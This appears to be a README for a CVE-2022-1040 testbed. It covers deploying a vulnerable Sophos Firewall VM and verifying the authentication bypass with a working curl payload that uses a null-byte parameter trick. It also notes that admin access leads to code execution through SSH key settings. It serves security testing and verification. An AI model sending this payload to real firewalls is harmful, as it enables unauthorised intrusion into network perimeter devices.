# CVE-2022-1040

An authentication bypass vulnerability in the User Portal and Webadmin allows a remote attacker to execute code in Sophos Firewall version `v18.5 MR3` and older.

A user with admin access can easily get RCE on the remote machine leveraging the `Administration` -> `Device access` -> `Public key authentication for admin` settings. It is possible to activate and add a new SSH public key that would grant SSH access to the administration console as the `admin` user.

## Testbed Deploy

These steps assumes that the testbed is deployed using VMWare on a x86_64 setup.

- Download a vulnerable firmware image: [VI-18.5.1_MR-1.VMW-318.zip](https://download.sophos.com/network/SophosFirewall/installers/VI-18.5.1_MR-1.VMW-318.zip)
- Import `sf_virtual.ovf` file VM On VMWare Workstation
- From VMWare settings change Network Adapter mode to Bridged in order to make the Virtual Machine connect to the LAN. Another possible configuration is to use a private LAN segment and to access the testbed from another VM.
- Remove or disable the third Interface In `Settings` -> `Edit Virtual Machine Settings` -> `Network Adapter 3` -> `Remove`
- Set the LAN router to make it recognize the device and make it reachable from inside the network. The VM interface MAC address can be found from `VMWare in VM` -> `Settings` -> `Hardware` -> `Network Adapter` -> `Advanced`
- Set network interface of `Network Adapter 2` to `Host-Only` mode so the testbed won't connect to the internet and force updates during the setup.
- Boot and access the VM with credentials `admin`:`admin`
- Set the correct IP address assigned on the LAN to the internal network interface of the Sophos Firmware VM (it defaults to `172.16.16.16`):
  - Start the machine
  - Authenticate as an admin
  - `Network Configuration` (1) -> `Interface Configuration` (1) -> (Enter) -> (Enter) -> `Set IPv4 Address (y/n)` (y) -> Insert new LAN address
- Connect to https://[TESTBED_IP]:4444 to complete the setup

Once set up, **the same VM can be cloned and updated in order to make a safe testbed**.

To update to the latest firmware version visit: `Backup and Firmware` -> `Firmware` -> `Latest Firware Available` -> `Check for new firmware` -> `Download` -> `Install`. Once done the new version should appear under `Firmware` -> `Version`, offering an option to reboot onto the new version.

The testbed can be accessed from web only through HTTPS.

_Note: Safe and Vulnerable testbed cannot co-exist simultaneously on the same network_

**The web interface port can be changed from the web interface on `Administration` -> `Admin and user settings` -> `Admin console and end-user interaction`**

### Troubleshoot

If, after some time (5-10 minutes) after the first boot, the web interface can't be reached try the following steps and then reboot the machine.

- Device Console (4): `set http_proxy response_timeout 180`
- Reset Admin Certificates
- Reboot and wait for the web interface to show up

## Vulnerability Verification

Issue the following curl command to verify the vulnerability on the target

```sh
curl -kH $'Content-Type: application/x-www-form-urlencoded' --data-binary $'mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\\u0000ef"%3a716}' https://[TARGET_IP:PORT]/webconsole/Controller
```

A vulnerable instance will return `200 OK` and the following JSON body:

```json
{"redirectionURL":"/webpages/index.jsp","status":200}
````

A safe instance will either redirect the user to `/webconsole/webpage/logout.jsp` with a `302 Found` status code (on newest releases) or return `200 OK` with the following JSON body:

```json
{"redirectionURL":"/webpages/index.jsp","status":-1}
```
